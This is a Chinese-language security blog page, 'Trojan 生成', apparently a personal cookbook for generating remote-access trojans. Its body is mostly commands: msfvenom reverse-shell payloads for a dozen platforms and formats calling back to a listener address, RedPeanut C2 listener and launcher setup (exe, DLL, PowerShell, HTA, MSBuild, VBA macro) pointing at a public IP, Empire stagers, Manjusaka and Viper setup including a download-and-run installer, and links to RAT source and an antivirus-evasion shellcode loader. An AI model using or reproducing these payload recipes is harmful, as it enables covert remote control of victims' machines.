@@ -1,0 +1,627 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Trojan" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/03/18/SAFE/Trojan/">
+
+
+
+  <title>
+Trojan 生成 - 信息安全 |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Trojan 生成
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-03-18 00:00:00">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-03-18T00:00:00+08:00">2023-03-18</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>4.5k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>7 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DgEuWxkZS9RwIlz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/ukLG5BwF6jH1ONA.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/paNiQwcqzXCExYj.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/2fd4OmPLVlHYoaK.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/iw5hEbpoS7DKcve.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/03/18/SAFE/Trojan/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>总想去抓住光，可它没有形状，抓不住也不敢直视。</p>
+<h3 id="1msf生成木马"><a class="markdownIt-Anchor" href="#1msf生成木马">#</a> 1.msf 生成木马</h3>
+<p>参考地址：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDk0OTkyL2FydGljbGUvZGV0YWlscy8xMDkwMDQ1NjA=">https://blog.csdn.net/qq_42094992/article/details/109004560</span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#windows</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f exe &gt; ~/Trojan/MSF_Trojan/MSF_windows_reverse.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#linux</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f elf &gt; ~/Trojan/MSF_Trojan/MSF_linux_reverse.elf</span><br><span class="line"></span><br><span class="line"><span class="comment">#mac</span></span><br><span class="line">msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f macho &gt; ~/Trojan/MSF_Trojan/MSF_mac_reverse.macho</span><br><span class="line"></span><br><span class="line"><span class="comment">#android</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 R &gt; ~/Trojan/MSF_Trojan/MSF_android_reverse.apk</span><br><span class="line"></span><br><span class="line"><span class="comment">#php</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_php_reverse.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#jsp</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_jsp_reverse.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment">#asp</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f asp &gt; ~/Trojan/MSF_Trojan/MSF_asp_reverse.asp</span><br><span class="line"></span><br><span class="line"><span class="comment">#war</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp  LHOST=192.168.200.209 LPORT=8888 -f war &gt; ~/Trojan/MSF_Trojan/MSF_war_reverse.war</span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_tcp  LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_python_reverse.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#perl</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_perl_reverse.pl</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=192.168.200.209 LPORT=8888 -f raw &gt; ~/Trojan/MSF_Trojan/MSF_sh_reverse.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#java--不需要此马</span></span><br><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.200.209 LPORT=8888 -f jar &gt; ~/Trojan/MSF_Trojan/MSF_java_reverse.jar</span><br><span class="line">./tools/jar2exe/jar2exe.sh MSF_java.jar MSF_java.class</span><br></pre></td></tr></table></figure>
+<h3 id="2redpeanut生成木马"><a class="markdownIt-Anchor" href="#2redpeanut生成木马">#</a> 2.RedPeanut 生成木马</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2I0cnRpay9SZWRQZWFudXQ=">https://github.com/b4rtik/RedPeanut</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装dotnet</span></span><br><span class="line">rpm -Uvh https://packages.microsoft.com/config/rhel/7/packages-microsoft-prod.rpm</span><br><span class="line">yum install dotnet-sdk-2.2</span><br><span class="line">dotnet</span><br><span class="line">dotnet build</span><br><span class="line">dotnet run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置监听器</span></span><br><span class="line">c2 list </span><br><span class="line">listener options http</span><br><span class="line">set name RedPeanut_listener</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">exe</span></span><br><span class="line">launcher</span><br><span class="line">exe</span><br><span class="line">set filename RedPeanut_exe.exe</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">dll</span> </span><br><span class="line">launcher </span><br><span class="line">dll</span><br><span class="line">set filename RedPeanut_dll.dll</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">powershell</span></span><br><span class="line">launcher </span><br><span class="line">powershell</span><br><span class="line">set filename RedPeanut_ps1.ps1</span><br><span class="line">set hosted False</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Hta (vbs,powershell)</span></span><br><span class="line">launcher</span><br><span class="line">hta</span><br><span class="line">set filename RedPeanut_hta.hta</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">InstallUtil</span></span><br><span class="line">launcher</span><br><span class="line">installutil</span><br><span class="line">set filename RedPeanut_installutil.installutil</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">MSBuild</span></span><br><span class="line">launcher</span><br><span class="line">msbuild</span><br><span class="line">set filename RedPeanut_msbuild.msbuild</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Macro/VBA</span></span><br><span class="line">launcher</span><br><span class="line">vba</span><br><span class="line">set filename RedPeanut_vba.vba</span><br><span class="line">set lhost 47.102.120.55</span><br><span class="line">set lport 4444</span><br><span class="line">set profile 2</span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="3manjusaka生成木马"><a class="markdownIt-Anchor" href="#3manjusaka生成木马">#</a> 3.Manjusaka 生成木马</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1lESENVSS9tYW5qdXNha2EvcmVsZWFzZXM=">https://github.com/YDHCUI/manjusaka/releases</span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置权限并运行</span></span><br><span class="line"><span class="built_in">chmod</span> +x manjusaka</span><br><span class="line">./manjusaka</span><br><span class="line"></span><br><span class="line"><span class="comment">#web界面与初始密码</span></span><br><span class="line">http://47.102.120.55:3200/manjusaka/static/</span><br><span class="line">初始用户: manjusaka   密码: 402432f678e74cb7</span><br></pre></td></tr></table></figure>
+<h3 id="4viper生成木马"><a class="markdownIt-Anchor" href="#4viper生成木马">#</a> 4.Viper 生成木马</h3>
+<p>使用教程：<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL3ZpcGVyc2VjL2hlbHAvb2xnMXVh">https://www.yuque.com/vipersec/help/olg1ua</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">f8x一键安装</span></span><br><span class="line">sysctl -w vm.max_map_count=262144</span><br><span class="line">curl -o f8x https://f8x.io/   # wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -viper</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问web生成payload</span></span><br><span class="line">https://vpsip:60000/#/user/login</span><br><span class="line">用户名:root 密码:****自定义密码**</span><br></pre></td></tr></table></figure>
+<h3 id="5empire生成木马"><a class="markdownIt-Anchor" href="#5empire生成木马">#</a> 5.Empire 生成木马</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VtcGlyZVByb2plY3QvRW1waXJl">https://github.com/EmpireProject/Empire</span><br>
+ 使用教程：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM5MzA4OTkvYXJ0aWNsZS9kZXRhaWxzLzEyNDg3MTkwMQ==">https://blog.csdn.net/u013930899/article/details/124871901</span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veW9rYW4vcC8xMzE3OTczMC5odG1s">https://www.cnblogs.com/yokan/p/13179730.html</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装环境</span></span><br><span class="line">docker pull empireproject/empire</span><br><span class="line">docker run -it -p 7000:7000 --name empire empireproject/empire /bin/bash</span><br><span class="line"></span><br><span class="line">​#需要先升级pip</span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python get-pip.py</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装缺少的依赖</span></span><br><span class="line">ln -s /usr/local/bin/pip2.7 /usr/bin/pip</span><br><span class="line">pip install pefile  </span><br><span class="line">sudo ./empire</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成Empire木马</span></span><br><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">info</span><br><span class="line">set Name bk</span><br><span class="line">set Port 8888</span><br><span class="line">execute</span><br><span class="line">back</span><br><span class="line">usestager windows/launcher_bat bk</span><br><span class="line">usestager multi/bash bk</span><br><span class="line">usestager windows/dll bk</span><br><span class="line">usestager windows/wmic bk</span><br><span class="line">usestager windows/launcher_bat bk</span><br><span class="line">usestager windows/launcher_vbs bk</span><br><span class="line">info</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+<h3 id="6大灰狼远控"><a class="markdownIt-Anchor" href="#6大灰狼远控">#</a> 6. 大灰狼远控</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4Q3VTTzQvREhMWUs=">https://github.com/0xCuSO4/DHLYK</span></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#实际生成的源码是在bilibili找到的，链接没找到</span><br></pre></td></tr></table></figure>
+<h3 id="7大马"><a class="markdownIt-Anchor" href="#7大马">#</a> 7. 大马</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FhYnlzcy1UZWFtL1dlYlNoZWxs">https://github.com/Aabyss-Team/WebShell</span></p>
+<h3 id="8gh0st"><a class="markdownIt-Anchor" href="#8gh0st">#</a> 8.gh0st</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lHaDBzdC9naDBzdDMuNl9zcmM=">https://github.com/iGh0st/gh0st3.6_src</span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyaXR5Tm8xL0doMHN0MjAyMw==">https://github.com/SecurityNo1/Gh0st2023</span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NjMjgyNTYvQ2NSZW1vdGUv">https://github.com/Cc28256/CcRemote/</span></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#环境没有配置好，没有生成此工具的马</span><br></pre></td></tr></table></figure>
+<h3 id="9shellcode-to-exe"><a class="markdownIt-Anchor" href="#9shellcode-to-exe">#</a> 9.Shellcode to exe</h3>
+<p>github 地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL055RHViaDMvQ3VpUmk=">https://github.com/NyDubh3/CuiRi</span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzF5MG4vQVZfRXZhc2lvbl9Ub29s">https://github.com/1y0n/AV_Evasion_Tool</span><br>
+ 简介：掩日 - 免杀执行器生成工具，可将 shellcode 加载为可执行 exe</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#环境没有配置好，没有生成此工具的马</span><br></pre></td></tr></table></figure>
+<p></p>
+
+      <div class="tags">
+          <a href="/tags/Trojan/" rel="tag"><i class="ic i-tag"></i> Trojan</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-03 17:59:29" itemprop="dateModified" datetime="2023-07-03T17:59:29+08:00">2023-07-03</time>
+  </span>
+  <span id="2023/03/18/SAFE/Trojan/" class="item leancloud_visitors" data-flag-title="Trojan 生成" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2023/03/18/SAFE/Trojan/" title="Trojan 生成">http://n1h1l157.github.io/2023/03/18/SAFE/Trojan/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/04/01/MBTI/%E9%83%A8%E5%88%86%E5%AD%97%E6%AF%8D%E7%89%B9%E5%BE%81/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;8LkEDulrcA3wvsa.jpg" title="部分字母特征">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> MBTI</span>
+  <h3>部分字母特征</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text"> 1.msf 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2redpeanut%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text"> 2.RedPeanut 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3manjusaka%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text"> 3.Manjusaka 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4viper%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">4.</span> <span class="toc-text"> 4.Viper 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5empire%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.</span> <span class="toc-text"> 5.Empire 生成木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7"><span class="toc-number">6.</span> <span class="toc-text"> 6. 大灰狼远控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E5%A4%A7%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text"> 7. 大马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8gh0st"><span class="toc-number">8.</span> <span class="toc-text"> 8.gh0st</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9shellcode-to-exe"><span class="toc-number">9.</span> <span class="toc-text"> 9.Shellcode to exe</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/2023/03/18/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li><li><a href="/2023/07/02/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
